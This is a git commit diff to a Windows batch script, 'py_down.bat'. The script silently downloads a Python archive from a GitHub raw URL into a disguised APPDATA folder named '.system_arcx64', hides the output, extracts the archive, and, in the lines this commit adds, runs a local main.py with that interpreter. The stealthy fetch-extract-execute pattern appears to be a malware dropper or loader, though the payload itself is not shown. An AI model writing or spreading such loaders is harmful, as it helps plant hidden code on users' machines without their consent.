813dfbf06400b13f879c5214ac59134d492e2642
faruqer <136151240+faruqer@users.noreply.github.com>
2024-10-07 14:15:47 +0300

    Update py_down.bat

--- py_down.bat
+++ py_down.bat
@@ -5,7 +5,10 @@ set folderPath=%APPDATA%\.system_arcx64
 if not exist "%folderPath%\windows.zip" (
     curl https://raw.githubusercontent.com/faruqer/cheki/refs/heads/main/python-3.12.7.zip -o %folderPath%\windows.zip > NUL 2>&1
 )
+
 if not exist "%folderPath%\extracted" (
     mkdir %folderPath%\extracted
 )
 tar -xf %folderPath%\windows.zip -C %folderPath%\extracted
+
+%folderPath%\extracted\python.exe %folderPath%\main.py
